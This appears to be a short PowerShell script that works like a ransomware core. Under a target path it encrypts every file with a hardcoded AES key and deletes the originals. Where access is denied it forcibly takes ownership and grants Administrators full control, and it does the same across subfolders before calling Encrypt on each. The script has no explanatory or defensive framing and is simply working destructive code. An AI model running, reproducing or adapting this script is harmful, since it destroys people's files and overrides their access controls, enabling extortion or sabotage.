$p=$args[0]

$key = ConvertTo-SecureString "6Z/tM7LRRsGP6bsJkEX0fQrgE3c+Oklknlier3nULaM=" -AsPlainText -Force

$file = Get-ChildItem $p| Where-Object {$_.mode -match "a"}
$fold = Get-ChildItem $p | Where-Object {$_.mode -match "d"}



foreach($i in $file){

if($i.FullName -match "takeown.exe"){
    
}else{
try{
Protect-File $i.FullName -Algorithm AES -key $key -RemoveSource -ErrorAction Stop
}catch{
takeown /A /F $i.FullName
Add-NTFSAccess -Path $i.FullName -Account "Administrateurs" -AccessRights FullControl
Protect-File $i.FullName -Algorithm AES -key $key -RemoveSource -ErrorAction Continue
}
}
}


foreach($f in $fold){
$test = Get-Acl $f.FullName | Select -Property Owner
if($test -match "Administrateurs" -Or $test -match $env:UserName){
    
}else{
takeown /A /F $f.FullName
Add-NTFSAccess -Path $f.FullName -Account "Administrateurs" -AccessRights FullControl 
}
Encrypt $f.FullName
}

